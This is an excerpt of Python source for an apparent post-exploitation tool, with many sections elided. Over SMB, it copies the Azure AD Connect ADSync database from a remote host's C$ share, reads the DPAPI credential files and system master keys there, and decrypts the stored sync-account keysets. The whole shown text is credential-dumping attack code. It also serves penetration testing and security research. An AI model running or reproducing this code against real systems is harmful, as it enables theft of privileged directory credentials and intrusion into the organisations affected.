...
class ADSRemoteOperations(RemoteOperations):
        ...
        try:
            ...
            with open("ADSync.mdf", "wb") as fh:
                self.__smbConnection.getFile(
                    "C$",
                    r"Program Files\Microsoft Azure AD Sync\Data\ADSync2019\ADSync.mdf",
                    fh.write,
                )
            with open("ADSync_log.LDF", "wb") as fh:
                self.__smbConnection.getFile(
                    "C$",
                    r"Program Files\Microsoft Azure AD Sync\Data\ADSync2019\ADSync_log.ldf",
                    fh.write,
                )
        finally:
    ...
    def gatherCredentialFiles(self, basepath):
        items = self.__smbConnection.listPath(
            "C$", r"{0}\AppData\Local\Microsoft\Credentials\\*".format(basepath)
        )
        outvaults = []
        for item in items:
    ...
    def processCredentialFile(self, file, userkey, basepath):
        ...
        remoteFileName = RemoteFileRO(
            self.__smbConnection,
            r"{1}\AppData\Local\Microsoft\Credentials\{0}".format(file, basepath),
            tree="C$",
        )
        try:
            remoteFileName.open()
        ...
        items = self.__smbConnection.listPath(
            "C$", r"%s\AppData\Roaming\Microsoft\Protect\*" % basepath
        )
        ...
        remoteFileName = RemoteFileRO(
            self.__smbConnection,
            r"{2}\AppData\Roaming\Microsoft\Protect\{0}\{1}".format(tsid, gmk, basepath),
            tree="C$",
        )
        try:
            remoteFileName.open()
    ...
    def decryptDpapiBlobSystemkey(self, item, key, entropy):
        ...
        remoteFileName = RemoteFileRO(
            self.__smbConnection, "SYSTEM32\\Microsoft\\Protect\\S-1-5-18\\%s" % mk
        )
        try:
            remoteFileName.open()
    ...
    def getMdbData(self, codec="utf-8"):
        ...
        out = {"cryptedrecords": [], "xmldata": []}
        keydata = None
        #
        if self.__options.from_file:
            logging.info(
                "Loading configuration data from %s on filesystem", self.__options.from_file
            )
            ...
            output = subprocess.Popen(
                ["ADSyncQuery.exe", dbpath], stdout=subprocess.PIPE
            ).communicate()[0]
...
class ADSync(OfflineRegistry):
    def __init__(
        self, samFile, isRemote=False, perSecretCallback=lambda secret: _print_helper(secret)
    ):
    ...
    def dump(self):
        try:
            ...
            try:
                ...
                self.__remoteOps = ADSRemoteOperations(
                    self.__smbConnection, self.__doKerberos, self.__kdcHost, self.__options
                )
                self.fetchMdb()
            ...
            if not self.__options.legacy:
                ...
                for credfile in files:
                    result = self.__remoteOps.processCredentialFile(
                        credfile, self.dpapiSystem["UserKey"], basepath
                    )
                    if result is not None:
                        if (
                            result["keyset_id"] != mdbdata["keyset_id"]
                            or result["instanceid"] != mdbdata["instance"]
                        ):
                            logging.warning(
                                "Found keyset %s instance %s, but need keyset %s instance %s. Trying next",
                                result["keyset_id"],
                                result["instanceid"],
                                mdbdata["keyset_id"],
                                mdbdata["instance"],
                ...
                if result is None:
                    ...
                    return
                cryptkeys = [
                    self.__remoteOps.decryptDpapiBlobSystemkey(
                        result["data"],
                        self.dpapiSystem["MachineKey"],
                        string_to_bin(mdbdata["entropy"]),
                    )
                ]
            else:
                ...
                try:
                    cryptkeys = self.__AdSync.process(
                        self.__remoteOps,
                        self.dpapiSystem["MachineKey"],
                        string_to_bin(mdbdata["entropy"]),
                    )
...
if __name__ == "__main__":
    ...
    parser.add_argument(
        "--legacy", action="store_true", help="Use legacy keyset storage location (registry)"
    )
    parser.add_argument(
        "--existing-db",
        action="store_true",
        help="Do not download the MDB but assume it is already in the current directory",
    )
    parser.add_argument(
        "--from-file",
        action="store",
